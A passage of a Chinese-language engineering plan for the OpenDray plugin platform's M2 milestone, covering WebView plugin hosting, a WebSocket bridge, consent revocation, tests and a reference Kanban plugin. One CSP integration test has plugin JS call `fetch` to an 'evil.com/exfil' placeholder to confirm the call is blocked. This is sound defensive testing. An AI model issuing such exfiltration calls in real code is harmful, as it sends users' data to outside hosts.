    final String bearerToken;      // 用于资产 + 桥接 WS 的 JWT
  }
  // 内部：每个 (pluginName, viewId) 实例一个 WebViewController。
  // 注入预加载 JavaScript 填充（内联定义 + 由构建哈希处理）。
  // 将 WebSocketChannel 连接到 /api/plugins/{name}/bridge/ws。
  // 来自 JS 的 postMessage → 将信封排入 WS 队列。
  // WS 响应 → 通过 webview.runJavaScript 回调 JS。
  ```
- **预加载 JS 填充 (40 行预算)：** 参见 §10 了解完整内容。通过 `controller.addJavaScriptChannel('OpenDrayBridge', ...)` 注入，且资产处理程序从嵌入式 Go 资产（而非插件包）提供 `script src="opendray-shim.js"`。该填充暴露 `window.opendray = { plugin, workbench, storage, events, version }` 并将每次调用路由至 `OpenDrayBridge.postMessage(envelope)`。
- **每个插件的隔离：** 在 Android 上，执行 `setDataDirectorySuffix(pluginName)`（为每个插件预先创建 WebView 进程）。在 iOS 上，每个 `WKWebView` 获取一个唯一的 `WKProcessPool()` + `WKWebsiteDataStore.nonPersistent()` (临时；状态在服务端 `plugin_kv` 中)。桌面端：webview_windows 支持 `BrowserEngine` 但不支持隔离 — 在 10-security.md 补丁中记录为 M2 限制。
- **验收：** 看板的 `ui/index.html` 在 WebView 内部加载；JS 可以调用 `await opendray.workbench.showMessage("hi")` 且 Flutter SnackBar 出现。
- **测试：** 组件测试 `test/features/workbench/webview_host_test.dart` 模拟 `WebViewController` + `WebSocketChannel`；断言信封往返传输。
- **复杂度：** L
- **风险/缓解：** 高 — 平台特定的 WebView 错误。缓解：在 T16 中显式列出支持平台；在插件作者指南中将桌面端记录为 “软隔离”。

### T16b — 桌面 WebView 回退
- **依赖：** T16
- **创建：** `app/lib/features/workbench/webview_host_desktop.dart` (通过 `kIsWeb`/Platform 进行条件导入)。
- **方法：** 在 Linux/Windows 桌面端，通过新的 `webview_flutter_platform_interface` + 社区版 `webview_flutter_web` (在 web 端仅使用 `<iframe>`) 使用 `webview_flutter`。Windows/macOS/Linux Flutter 桌面端使用 `desktop_webview_window` (一个单独窗口) — 可接受的 UX 降级：插件视图在模态窗口而非内联打开。对 M2 是可以接受的；内联桌面 webview 是 M6 的完善项。
- **验收：** 看板在 Linux 桌面构建上打开 (即使是在单独窗口中)。在插件作者指南 (`docs/plugin-platform/11-developer-experience.md` 补丁) 中记录。
- **复杂度：** M
- **风险/缓解：** 中 — webview_flutter 对桌面端的支持尚处于起步阶段。缓解：根据路线图措辞，桌面端是验收可选平台 ("在 Android、iOS 和桌面上运行" — 桌面端涵盖 Linux/macOS/Windows Flutter 桌面，而非服务端)。仅为工程内部试用（dogfood）发布 `.exe`/`.app`/`.deb`。

### T17 — Flutter: 活动栏轨道
- **依赖：** T3 (服务端暴露活动栏), T14 (SSE), T16
- **创建：** `app/lib/features/workbench/activity_bar.dart`
- **修改：** `app/lib/features/workbench/workbench_models.dart` — 添加 DTO `WorkbenchActivityBarItem`、`WorkbenchView`、`WorkbenchPanel`（镜像 Go 结构体）。扩展 `FlatContributions.fromJson`。`app/lib/features/workbench/workbench_service.dart` — 扩展 getter；监听 SSE 的 `contributionsChanged` + 重新获取。`/app/lib/features/dashboard/dashboard_page.dart` — 根据 08-workbench-slots.md 在左侧轨道 (平板) / 底部导航溢出 (手机) 挂载 `ActivityBar`。
- **手机折叠规则：** 根据 08-workbench-slots.md，>4 个项目折叠进 “更多” 页面。
- **验收：** 安装看板后，看板图标在 200 毫秒内出现在轨道中 (通过 SSE)。点击打开关联视图。
- **测试：** 组件测试 `test/features/workbench/activity_bar_test.dart` — 3 个条目渲染，5 个条目折叠，点击触发 `WorkbenchService.openView`。
- **复杂度：** M

### T18 — Flutter: 视图宿主容器
- **依赖：** T16, T17
- **创建：** `app/lib/features/workbench/view_host.dart`
- **修改：** `app/lib/features/dashboard/dashboard_page.dart` — 将主内容包装在 `ViewHost` 中，它将当前聚焦的视图 id 映射到 `PluginWebView` (render=webview) 或 `DeclarativeViewHost` 占位符 (render=declarative；声明式渲染是 M2 之后的完善项，发布显示 “声明式视图在 M5 推出 — 目前请使用 webview” 的桩)。
- **验收：** 点击看板活动图标加载看板 ui/index.html；向下滑动关闭；重新点击重新打开缓存视图。
- **测试：** 组件测试使用模拟的 WebView 构造函数挂载 ViewHost，断言路由连接。
- **复杂度：** M

### T19 — Flutter: 面板插槽
- **依赖：** T3, T16
- **创建：** `app/lib/features/workbench/panel_slot.dart`
- **修改：** `app/lib/features/session/session_page.dart` — 添加一个底部抽屉插槽，列出所贡献的面板，并在打开时托管一个 `PluginWebView`。
- **手机：** 从底部边缘向上滑动显示抽屉；点击选项卡标签切换面板。
- **平板：** 底部始终可见的选项卡栏。
- **验收：** 声明 `contributes.panels` 的插件（M2 中的看板没有；测试专用固定装置有）在会话页面底部抽屉中获得一个选项卡。
- **测试：** 包含两个贡献面板的组件测试。
- **复杂度：** M

### T20 — Flutter: 插件桥接频道 + 存储/事件客户端
- **依赖：** T16
- **修改：** `app/lib/features/workbench/plugin_bridge_channel.dart` (在 T16 中创建，但具体协议在此落地)。
- **核心：**
  - 使用 bearer 认证开启到 `/api/plugins/{name}/bridge/ws` 的 `WebSocketChannel`。
  - 将信封从 JS postMessage → WS 泵送；通过 `runJavaScript` 将 WS → JS 泵送。
  - 追踪未完成的调用 id，将响应与填充中的解析器匹配。
  - 在重新连接 (网络波动) 时，重新订阅所有记录的 `events.subscribe` 句柄。
- **验收：** 看板的 JS 可以端到端调用所有三个命名空间。
- **测试：** 组件测试使用记录每个信封的模拟 `WebSocketChannel`；断言填充正确地进行回显。
- **复杂度：** M

### T21 — Flutter: 运行时同意切换 UI
- **依赖：** T12
- **创建：** `app/lib/features/settings/plugin_consents_page.dart`
- **修改：** `app/lib/core/api/api_client.dart` — 添加 `getPluginConsents`、`revokePluginCapability`、`revokeAllPluginConsents`。
- **验收：** 用户为看板关闭 “存储 (Storage)” 切换开关 → Flutter 发起 `DELETE /api/plugins/kanban/consents/storage` → 下一次来自看板 WebView 的 `storage.set` 失败并显示 EPERM，显示一个 SnackBar。UI 不会崩溃；可以重新打开该开关。
- **测试：** 组件测试断言 切换状态 → API 调用 映射。
- **复杂度：** M

### T22 — 参考插件 `plugins/examples/kanban/`
- **依赖：** T1, T2 (验证)
- **创建：** `/home/linivek/workspace/opendray/plugins/examples/kanban/manifest.json`、`ui/index.html`、`ui/main.js`、`ui/styles.css`、`README.md`
- **验收：** 参见 §10 了解完整内容。通过 `opendray plugin validate ./plugins/examples/kanban`。安装并打开视图后，看板让用户添加/删除卡片；状态幸免于重启（通过 `storage.set/get`）；空闲会话事件绘制一个 “会话空闲” 横幅。
- **测试：** 由 T23 e2e 覆盖。
- **复杂度：** S (计划层面); M (实现层面)

### T23 — 看板 E2E 测试扩展
- **依赖：** T7, T8, T10, T11, T12, T14, T15, T22
- **创建：** 使用 `TestE2E_KanbanFullLifecycle` (构建标签 `//go:build e2e`) 扩展 `/home/linivek/workspace/opendray/plugin/e2e_test.go`。
- **场景：**
  1. 通过 `POST /api/plugins/install` 安装看板 (本地源, `OPENDRAY_ALLOW_LOCAL_PLUGINS=1`)。
  2. 确认令牌。
  3. 订阅 SSE `/api/workbench/stream` 并断言收到 `contributionsChanged`。
  4. `GET /api/workbench/contributions` → 包含看板的活动栏 + 视图。
  5. 通过 `GET /api/plugins/kanban/assets/index.html` 获取 index.html 资产 — 断言 CSP 标头，内容长度 > 0。
  6. 开启到 `/api/plugins/kanban/bridge/ws` 的 WS。
  7. 通过 WS 发送 `storage.set` → 断言 OK + 数据库行存在。
  8. 发送 `storage.get` → 断言返回相同的值。
  9. 发送 `events.subscribe {name:"session.*"}` → 断言当伪造的会话事件被推入 `HookBus` 时出现流分块。
  10. `DELETE /api/plugins/kanban/consents/storage`；再次发送 `storage.set`；断言在 DELETE 返回后的 **200 毫秒实际耗时**内出现 EPERM。
  11. 重启测试套件 (新 `gateway.Server`, 相同数据库)；重新开启 WS；`storage.get` 仍然返回原始值 (持久性)。
  12. `DELETE /api/plugins/kanban` → 资产返回 404, `plugin_kv` 行级联删除。
- **验收：** `go test -race -tags=e2e ./plugin/...` 通过。SLO 步骤耗时通过硬性期限断言。
- **复杂度：** L
- **风险/缓解：** 高 — 时间不可靠性。缓解：SLO 步骤在 DELETE 之前和 EPERM 响应之后使用 `time.Now()`；测试机器通常满足 <50 毫秒。

### T24 — 文档更新
- **依赖：** T8, T16, T20
- **修改：** `/home/linivek/workspace/opendray/docs/plugin-platform/11-developer-experience.md` — 添加 “WebView 插件编写：10 分钟教程”。`/home/linivek/workspace/opendray/docs/plugin-platform/10-security.md` — 添加一段说明桌面端 WebView 在 M2 中仅具有 “软隔离”。`/home/linivek/workspace/opendray/docs/plugin-platform/SUMMARY.md` — 将 M2 项目标记为已交付。
- **验收：** 新插件作者可以按照指南在 ≤30 分钟内发布 webview 插件。
- **复杂度：** S

### T25 — CSP 集成测试
- **依赖：** T8
- **创建：** `/home/linivek/workspace/opendray/gateway/plugins_assets_csp_test.go`
- **场景：** (i) 获取看板包分发的每种内容类型 (html/js/css/png) 并断言 CSP 标头与黄金字符串字节级一致。(ii) 在 Flutter 组件测试的无头 WebView 中加载 HTML，尝试在 JS 中执行 `fetch("https://evil.com/exfil")`；断言 WebView 控制台发出 CSP 违规。
- **验收：** 两项检查均通过。
- **复杂度：** M

---

## 3. 建议的线性顺序

关键路径 (单线程, 18 个顺序步骤)：

```
T1 → T2 → T3 → T5 → T6 → T7 (桩) → T8 → T10 → T11 → T9 → T12 → T14 → T15 → T22 → T16 → T17 → T18 → T23
```

### 分叉点

**在 T1 + T5 落地后 (第一个 PR 缝隙; 参见 §9)** 三个分支可以并行运行：

- **分支 A — 服务端核心：** T3 → T6 → T7 → T9, T10, T11 (T6 落地后并行) → T12 → T14 → T15 → T23。
- **分支 B — 资产 + CSP：** T8 → T25 (独立于桥接；解锁 T16 渲染)。
- **分支 C — Flutter：** T16 → T17, T18, T19, T20 (T16 发布后四者并行) → T21。

**T22** (参考插件) 除了 T1 外没有服务端依赖；它可以很早就作为 SDK 固定装置编写，并用作每个集成测试的种子。
**T4** (兼容性扩展) 是独立的，可以在 T1 后的任何时间落地。
**T13** (命令分发器 openView) 在 T3 暴露视图查找后落地；它独立于桥接 WS。

---

## 4. M2 中锁定的接口

### 4.1 引入的 Go 类型 (权威)

```go
// plugin/manifest.go 添加项
type ActivityBarItemV1 struct { ID, Icon, Title, ViewID string }
type ViewV1            struct { ID, Title, Container, Icon, When, Render, Entry string }
type PanelV1           struct { ID, Title, Icon, Position, Render, Entry string }
// ContributesV1 获得: ActivityBar []ActivityBarItemV1; Views []ViewV1; Panels []PanelV1

// plugin/contributions/registry.go 添加项
type OwnedActivityBarItem struct{ PluginName string; plugin.ActivityBarItemV1 }
type OwnedView            struct{ PluginName string; plugin.ViewV1 }
type OwnedPanel           struct{ PluginName string; plugin.PanelV1 }
// FlatContributions 获得: ActivityBar, Views, Panels
func (r *Registry) HasView(plugin, viewId string) bool      // 新方法, 由 T13 使用

// plugin/bridge/protocol.go (T5)
type Envelope struct{ ... }    // 参见 T5 了解完整规范
type WireError struct{ Code, Message string; Data json.RawMessage }
func NewOK / NewErr / NewStreamChunk / NewStreamEnd

// plugin/bridge/manager.go (T6)
type Manager struct { ... }
type Conn    struct { Plugin string; /* 未导出 */ }
type ConsentChange struct { Plugin, Cap string; Revoked bool }
func (m *Manager) Register(plugin string, c *Conn)
func (m *Manager) Unregister(plugin string, c *Conn)
func (m *Manager) InvalidateConsent(plugin, cap string)
func (m *Manager) OnConsentChanged(plugin string) <-chan ConsentChange

// plugin/bridge/api_*.go (T9/T10/T11)
type Dispatcher interface {
    Dispatch(ctx context.Context, plugin, method string, args json.RawMessage, conn *Conn) (any, error)
}
// WorkbenchAPI, StorageAPI, EventsAPI 均满足 Dispatcher 接口。

// kernel/store/plugin_kv.go (T10)
func (d *DB) KVGet(ctx context.Context, plugin, key string) (json.RawMessage, bool, error)
func (d *DB) KVSet(ctx context.Context, plugin, key string, value json.RawMessage) error
func (d *DB) KVDelete(ctx context.Context, plugin, key string) error
func (d *DB) KVList(ctx context.Context, plugin, prefix string) ([]string, error)

// kernel/store/plugin_consents.go (T12 添加项)
func (d *DB) UpdateConsentPerms(ctx context.Context, name string, perms json.RawMessage) error

// gateway 添加项
type WorkbenchBus struct{ ... }
func (b *WorkbenchBus) Publish(ev WorkbenchEvent)
type WorkbenchEvent struct { Kind, Plugin string; Payload json.RawMessage }
```

### 4.2 引入的 HTTP + WS 端点

| 方法 + 路径 | 认证 | 请求 / 协议 | 响应 |
|---|---|---|---|
| `GET /api/plugins/{name}/assets/*` | JWT | — | 200 + 文件字节 + CSP 标头 / 400 EBADPATH / 404 |
| `GET /api/plugins/{name}/bridge/ws` | JWT + Origin 检查 | WebSocket 升级; 信封协议 | 101 协议切换 / 403 / 404 |
| `GET /api/plugins/{name}/consents` | JWT | — | 200 `{"storage":true,"events":["session.*"],...}` |
| `DELETE /api/plugins/{name}/consents/{cap}` | JWT | — | 200 `{revoked:"storage"}` / 400 EINVAL / 404 |
| `DELETE /api/plugins/{name}/consents` | JWT | — | 200 `{revoked:"all"}` |
| `GET /api/workbench/stream` | JWT | SSE | 200 事件流 (每 20 秒心跳) |

### 4.3 WS 握手规则

- 子协议：无（原始 JSON 消息）。
- `Origin` 必须匹配以下之一：`app://opendray`、配置的前端宿主 URL、`http://localhost:*`、`http://127.0.0.1:*`。否则在升级前返回 403。
- 需要 `Authorization: Bearer <jwt>`（所有受保护路由使用的相同中间件；WS 升级尊重标头，因为 chi 在运行处理程序体之前会调用 `Middleware.ServeHTTP`）。
- 读取期限 60 秒（每 30 秒进行 ping/pong）；每个信封的写入期限 10 秒。
- 最大消息大小 1 MiB（匹配 HTTP 侧的 `bodySizeLimiter`）。

### 4.4 JSON 贡献架构 (安装时接受)

```json
"contributes": {
  "activityBar": [
    { "id": "kanban.activity", "icon": "icons/kanban.svg",
      "title": "Kanban", "viewId": "kanban.board" }
  ],
  "views": [
    { "id": "kanban.board", "title": "Kanban Board",
      "container": "activityBar", "render": "webview",
      "entry": "index.html" }
  ],
  "panels": [ /* 可选, 形状相同 */ ]
}
```

### 4.5 M2 中发布的 TypeScript 桥接表面

```ts
// 来自 @opendray/plugin-sdk (04-bridge-api.md 完整表面的子集)。
interface OpenDray {
  version: string;
  plugin: { name: string; version: string; publisher: string; dataDir: string; workspaceRoot?: string };
  workbench: {
    showMessage(msg: string, opts?: { kind?: 'info'|'warn'|'error'; durationMs?: number }): Promise<void>;
    openView(viewId: string): Promise<void>;
    updateStatusBar(id: string, patch: { text?: string; tooltip?: string; command?: string }): Promise<void>;
    runCommand(commandId: string, ...args: unknown[]): Promise<unknown>;
    theme(): Promise<{ id: string; kind: 'light'|'dark'|'high-contrast' }>;
    onThemeChange(cb: (t: { id: string; kind: string }) => void): { dispose(): void };
  };
  storage: {
    get<T = unknown>(key: string, fallback?: T): Promise<T>;
    set(key: string, value: unknown): Promise<void>;
    delete(key: string): Promise<void>;
    list(prefix?: string): Promise<string[]>;
  };
  events: {
    subscribe(name: string, cb: (ev: unknown) => void): { dispose(): void };
    publish(name: string, payload: unknown): Promise<void>;
  };
}
```

在 M2 中调用的任何其他 `opendray.*` 命名空间都会抛出 `EUNAVAIL` — TS 类型为作者暴露了完整的 04-bridge-api.md 表面，但运行时会拒绝非 M2 命名空间。

### 4.6 CSP 标头 (逐字)

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
```

WebView 的 `'self'` 解析为网关源，因为资产是从那里提供的。`connect-src ws: wss:` 允许连接到同一源的桥接 WS。`frame-ancestors 'none'` 防止插件 UI 被另一个页面嵌入 (iframe)。

---

## 5. 测试策略

### 单元测试 (go test -race, 涉及包的目标 ≥80%)
- 扩展后的 `plugin/manifest_v1_test.go` (T1, T2)
- 扩展后的 `plugin/manifest_validate_test.go` (T2)
- 扩展后的 `plugin/contributions/registry_test.go` (T3)
- 扩展后的 `plugin/compat/synthesize_test.go` (T4)
- `plugin/bridge/protocol_test.go` (T5)
- `plugin/bridge/manager_test.go` (T6)
- `plugin/bridge/api_workbench_test.go` (T9)
- `plugin/bridge/api_storage_test.go` (T10)
- `plugin/bridge/api_events_test.go` (T11)
- `kernel/store/plugin_kv_test.go` (T10)
- 扩展后的 `kernel/store/plugin_consents_test.go` (T12)
- 扩展后的 `plugin/commands/dispatcher_test.go` (T13)

### 集成测试
- `gateway/plugins_bridge_test.go` (T7) — 使用 `httptest.NewServer` + `websocket.Dialer` 客户端。
- 包含 `plugins_assets_csp_test.go` (T25) 的 `gateway/plugins_assets_test.go` (T8)。
- 包含 200 毫秒 SLO 测试的 `gateway/plugins_consents_test.go` (T12)。
- `gateway/workbench_stream_test.go` (T14)。
- 扩展后的 `gateway/plugins_install_test.go` (T15)。

### 端到端测试 (构建标签 `//go:build e2e`)
- `plugin/e2e_test.go` 获得 `TestE2E_KanbanFullLifecycle` (T23)，同时 M1 的 `TestE2E_TimeNinjaFullLifecycle` 必须继续原封不动地通过。

### Flutter 组件测试
- `test/features/workbench/webview_host_test.dart` (T16)
- `test/features/workbench/activity_bar_test.dart` (T17)
- `test/features/workbench/view_host_test.dart` (T18)
- `test/features/workbench/panel_slot_test.dart` (T19)
- `test/features/workbench/plugin_bridge_channel_test.dart` (T20)
- `test/features/settings/plugin_consents_page_test.dart` (T21)

### 测试 WebView↔桥接 往返
- Go 侧：`httptest.NewServer` + `websocket.Dialer` 模拟 Flutter WebView。我们直接通过 WS 驱动信封并断言响应。90% 的覆盖率无需真正的 WebView。
- Flutter 侧：组件测试桩处理 `WebViewController` + `WebSocketChannel`；测试断言填充会发出正确的信封（JS 填充本身作为字符串常量加载，并通过轻量级 JS 解释器测试进行练习 — 但对于 M2，我们**不**要求在 CI 中运行真正的 WebView，因为它是平台原生的且成本高昂。e2e 测试在本地开发运行和夜间 CI 车道中使用真正的 WebView）。

### 覆盖率门控
CI 继续运行 `go test -race -cover ./...`，涉及的每个包都有 80% 的行覆盖率。未涉及的包豁免。

---

## 6. 迁移与兼容性

### 数据库迁移
**零新 SQL 文件。** M1 已经将 `011_plugin_kv.sql` 和 `012_plugin_secret.sql` 作为骨架发布；M2 增加了写入者。`plugin_name REFERENCES plugins(name)` 上现有的 `ON DELETE CASCADE` 已经处理了卸载清理。

### M1 合约保留
- 每个 M1 HTTP 端点继续原封不动地工作：`/api/plugins/install`、`/install/confirm`、`DELETE /api/plugins/{name}`、`/api/plugins/{name}/audit`、`GET /api/workbench/contributions`、`POST /api/plugins/{name}/commands/{id}/invoke`。
- 现有的 `ContributesV1` 序列化是增量的 — 仅读取 commands/statusBar/keybindings/menus 的旧版客户端继续工作（新字段为 omitempty）。
- `FlatContributions` JSON 是增量的 — 仅解析这四个字段的现有 Flutter M1 构建继续运行。
- `plugin.Runtime.Register` / `.Remove` 签名未改变。
- 清单 v1 验证器根据 M1 的设计，已经通过透传接受 `contributes.activityBar`/`views`/`panels`；T2 增加了严格验证。通过在 T2 合并后对每个绑定的清单运行 M1 的黄金文件测试来确认。

### 兼容性不变性
1. `plugins/agents/*` + `plugins/panels/*` 下的所有 17 个绑定清单继续保持字节级一致地加载。
2. 现有的面板插件 HTTP API (`/api/docs/*`, `/api/files/*`, `/api/git/*`, `/api/database/*`, `/api/tasks/*`, `/api/logs/*`) 未触动。
3. 兼容性合成器 (T4) 对于面板类型是增量式的；代理类型保持不变。
4. `time-ninja` 参考插件继续逐字通过其 M1 E2E 测试。

### 回滚
仅向前。如果 M2 需要紧急回滚，Flutter 工作台可以进行功能开关：设置 `OPENDRAY_DISABLE_WEBVIEW_PLUGINS=1` 使 `pluginsBridgeWS` 返回 503 且 Flutter 活动栏隐藏 webview 表单插件。后端仍分发资产 (无害)。服务端回滚通过撤销 T7 合并提交实现；无需撤销架构更改。

---

## 7. 完成定义 (DoD)

- [ ] `kanban` 示例插件在 Android、iOS 和桌面 Flutter 构建上通过 M1 流程（`POST /api/plugins/install` → 同意 → `/install/confirm`）安装。
- [ ] 看板的活动栏图标在安装确认后的 200 毫秒内渲染（观察到 SSE `contributionsChanged`）。
- [ ] 点击图标打开托管在 WebView 中的看板视图；UI 允许用户添加和删除卡片。
- [ ] 卡片状态幸免于后端重启（通过 `opendray.storage.set/get` 持久化到 `plugin_kv`）。
- [ ] 看板订阅 `session.*` 事件，并在会话进入空闲状态时显示横幅。
- [ ] `DELETE /api/plugins/kanban/consents/storage` 导致看板 WebView 下一次 `storage.set` 在 DELETE 返回后的 **200 毫秒**实际耗时内由于 `EPERM` 而失败。通过 `TestE2E_KanbanFullLifecycle` 硬性期限断言进行验证。
- [ ] `M1` `time-ninja` 继续原封不动地通过其 M1 E2E 测试 — `plugin/e2e_test.go::TestE2E_TimeNinjaFullLifecycle` 中零回归。
- [ ] 来自 `/api/plugins/{name}/assets/*` 的每个响应都带有 §4.6 中定义的精确 CSP 标头。由 `plugins_assets_csp_test.go` 验证。
- [ ] 当插件 JS 尝试 `self`/`ws:`/`wss:` 之外的网络请求时，WebView 控制台记录 CSP 违规。
- [ ] `go test -race -cover ./...` 涉及 M2 的每个包覆盖率 ≥ 80%。
- [ ] `go vet ./...` 清洁；涉及的包 `staticcheck ./...` 清洁；`gosec ./...` 未引入新的 HIGH 发现。
- [ ] `flutter test` 通过：每个 M1 组件测试仍然绿色 + 所有新的 M2 组件测试绿色。
- [ ] 所有 17 个绑定的旧版清单逐字节一致地加载（黄金文件断言）。
- [ ] iOS 归档构建成功。WebView 加载由回环网关提供的来自 `${PluginsDataDir}/kanban/<version>/ui/` 的看板包；运行时不获取任何远程代码。来自 10-security.md 的 App Store 审核说明逐字复制到 `ios/fastlane/metadata/review_notes.txt`。
- [ ] 设置 → 插件 页面列出带有单项能力切换开关的看板；关闭存储会导致 UI 在随后的看板调用中显示 EPERM toast。
- [ ] `opendray plugin validate ./plugins/examples/kanban` 以 0 退出。具有孤儿 `activityBar.viewId` 的手动构建清单以 1 退出并显示有用的错误。
- [ ] 文档：`/home/linivek/workspace/opendray/docs/plugin-platform/11-developer-experience.md` 包含 WebView 插件编写教程；`10-security.md` 提及桌面端 “软隔离” 限制；`SUMMARY.md` 将 M2 项目标记为绿色。

---

## 8. 超出范围的逃生阀

M2 阻塞者最可能感受到后续里程碑吸引力的前 5 个地方，以及批准的权宜之计：

1. **“我的插件需要从工作区读取文件。”**
   权宜之计：`opendray.fs.*` 属于 M3（需要管理器工作以进行路径范围强制执行 + 监听）。对于 M2，插件作者通过 `storage.set` 持久化用户输入的数据，或者公开一个由宿主通过 M1 的 `exec`/`runTask` 类型运行的贡献命令。在 11-developer-experience.md 中记录。

2. **“我需要从插件 JS 调用外部 HTTP API。”**
   权宜之计：`opendray.http.*` 属于 M3。CSP 阻止直接 `fetch()` 到非 self 源。对于 M2，插件作者可以贡献一个调用宿主侧 `curl` 的 `exec` 类型命令（需要 `permissions.exec`），或者在其服务端边车 (M3) 中构建后端助手。M2 中没有桥接快捷方式。

3. **“桌面端 WebView 不以内联方式渲染；它弹出一个单独的窗口。”**
   权宜之计：在 T16b 中记录的可接受的 M2 限制。内联桌面 webview 是 M6 的完善项。Dogfood 影响：工程桌面构建获得模态窗口 UX；移动端（OpenDray 的主要目标）不受影响。

4. **“插件需要运行时同意提示（例如首次使用时读取剪贴板）。”**
   权宜之计：05-capabilities.md 的 §4 仅提到了 `clipboard:read` 和 `llm.*` 的首次使用提示。两者都不在 M2 发布命名空间中；推迟到 M3/M5。所有 M2 能力都是安装时授予的，在每次调用时由 Gate 强制执行。

5. **“看板需要实时用户在线 / 多设备同步。”**
   权宜之计：完全超出 v1 范围；OpenDray 实例之间没有 p2p 频道。插件作者可以构建自己的后端并通过 `http` (M3) 进行通信。M2 优雅地拒绝了该问题。

---

## 9. 第一个 PR 缝隙

**解锁并行工作的最小可合并提交：** T1 + T3 + T5。

内容：
- `/home/linivek/workspace/opendray/plugin/manifest.go` — 使用 activityBar/views/panels 字段 + 三个新结构体扩展 `ContributesV1` (T1)。
- `/home/linivek/workspace/opendray/plugin/contributions/registry.go` — 针对新插槽扩展 `FlatContributions` + `Flatten()` (T3)。
- `/home/linivek/workspace/opendray/plugin/bridge/protocol.go` — Envelope / WireError 类型 + 构造函数 (T5)。
- `/home/linivek/workspace/opendray/plugin/bridge/protocol_test.go` — 往返传输 + 黄金文件测试。
- `/home/linivek/workspace/opendray/plugin/manifest_v1_test.go` — 扩展后的兼容性 + webview 加载测试。
- `/home/linivek/workspace/opendray/plugin/contributions/registry_test.go` — 扩展后的排序/扁平化测试。

**同一 PR 中的可选额外内容：** 注册 `r.Get("/api/plugins/{name}/bridge/ws", s.pluginsBridgeWS)` 并响应 `501 ENOTIMPL` 的桩处理程序 `/home/linivek/workspace/opendray/gateway/plugins_bridge.go`。这允许 Flutter T16/T20 立即针对 URL 形状进行连接。

净行为变化：渲染 UI 零差异。新类型是增量式的；旧清单加载未改变；旧的 FlatContributions JSON 仅增加了空数组。

为什么先做：解锁三个并行分支 (参见 §3)。任何人都可以开始针对类型进行构建，而不会相互干扰。

大小目标：≤500 行变更。一次评审即可完成。

---

## 10. 参考插件规范 — `plugins/examples/kanban/`

### 待创建的文件

```
plugins/examples/kanban/
├── manifest.json
├── README.md
└── ui/
    ├── index.html
    ├── main.js
    └── styles.css
```

### `plugins/examples/kanban/manifest.json`

```json
{
  "$schema": "https://opendray.dev/schemas/plugin-manifest-v1.json",
  "name": "kanban",
  "version": "1.0.0",
  "publisher": "opendray-examples",
  "displayName": "Kanban",
  "description": "一个极简的看板。M2 参考插件 — 练习 activityBar, views, storage, workbench.showMessage, events.subscribe。",
  "icon": "📋",
  "engines": { "opendray": "^1.0.0" },
  "form": "webview",
  "activation": ["onView:kanban.board"],
  "contributes": {
    "activityBar": [
      { "id": "kanban.activity", "icon": "📋", "title": "Kanban", "viewId": "kanban.board" }
    ],
    "views": [
      { "id": "kanban.board", "title": "Kanban Board",
        "container": "activityBar", "render": "webview", "entry": "index.html" }
    ]
  },
  "permissions": {
    "storage": true,
    "events": ["session.idle", "session.start", "session.stop"]
  }
}
```

### `plugins/examples/kanban/ui/index.html`

```html
<!doctype html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Kanban</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <header id="topbar">
    <h1>看板</h1>
    <button id="addCard">+ 添加卡片</button>
    <span id="sessionStatus" hidden></span>
  </header>
  <main>
    <section class="column" data-status="todo"><h2>待办</h2><ul></ul></section>
    <section class="column" data-status="doing"><h2>正在进行</h2><ul></ul></section>
    <section class="column" data-status="done"><h2>已完成</h2><ul></ul></section>
  </main>
  <script src="main.js" type="module"></script>
</body>
</html>
```

### `plugins/examples/kanban/ui/main.js`

```js
const STORAGE_KEY = "cards";
let cards = [];

async function loadCards() {
  cards = await opendray.storage.get(STORAGE_KEY, []);
  render();
}
async function saveCards() {
  await opendray.storage.set(STORAGE_KEY, cards);
}
function render() {
  for (const col of document.querySelectorAll(".column")) {
    const list = col.querySelector("ul");
    list.innerHTML = "";
    for (const c of cards.filter(c => c.status === col.dataset.status)) {
      const li = document.createElement("li");
      li.textContent = c.title;
      li.addEventListener("click", () => removeCard(c.id));
      list.appendChild(li);
    }
  }
}
async function addCard() {
  const title = "卡片 " + Math.floor(Math.random() * 1000);
  cards.push({ id: crypto.randomUUID(), title, status: "todo" });
  await saveCards();
  render();
  await opendray.workbench.showMessage(`已添加 "${title}"`, { kind: "info" });
}
async function removeCard(id) {
  cards = cards.filter(c => c.id !== id);
  await saveCards();
  render();
}
document.getElementById("addCard").addEventListener("click", addCard);
opendray.events.subscribe("session.idle", () => {
  const el = document.getElementById("sessionStatus");
  el.textContent = "会话已空闲";
  el.hidden = false;
  setTimeout(() => el.hidden = true, 3000);
});
loadCards();
```

### `plugins/examples/kanban/ui/styles.css`

```css
:root { color-scheme: dark light; font-family: system-ui, sans-serif; }
body { margin: 0; padding: 16px; background: var(--od-editor-background, #0d1117); color: var(--od-editor-foreground, #eee); }
#topbar { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
main { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
.column { background: rgba(255,255,255,0.05); border-radius: 8px; padding: 12px; min-height: 240px; }
.column h2 { margin: 0 0 8px; font-size: 14px; opacity: 0.7; }
.column ul { list-style: none; margin: 0; padding: 0; }
.column li { padding: 8px; margin: 4px 0; background: rgba(255,255,255,0.1); border-radius: 4px; cursor: pointer; }
#addCard { padding: 6px 12px; border: 0; border-radius: 4px; background: #238636; color: white; cursor: pointer; }
#sessionStatus { font-size: 12px; opacity: 0.7; }
```

### `plugins/examples/kanban/README.md`

```markdown
# kanban — OpenDray M2 参考插件

三列，点击删除。状态保存在 `opendray.storage` 中。通过 `opendray.events` 在任何会话进入空闲状态时显示横幅。

## 尝试一下
1. `OPENDRAY_ALLOW_LOCAL_PLUGINS=1 opendray`
2. `opendray plugin install ./plugins/examples/kanban`
3. 同意屏幕显示：storage + events(session.idle,start,stop)。
4. 点击活动栏中的看板图标 (📋) → “+ 添加卡片” → 卡片在重启后仍然存在。
5. 在设置中撤销存储权限 → 添加卡片在 200 毫秒内由于 “permission denied” toast 而失败。

## 此插件证明了什么
- 活动栏 → 视图 → webview 包 端到端流程
- 带有卸载时级联删除功能的 `opendray.storage.set/get`
- `opendray.workbench.showMessage` 交付 Flutter SnackBar
- `opendray.events.subscribe("session.idle")` 通过 HookBus 触发
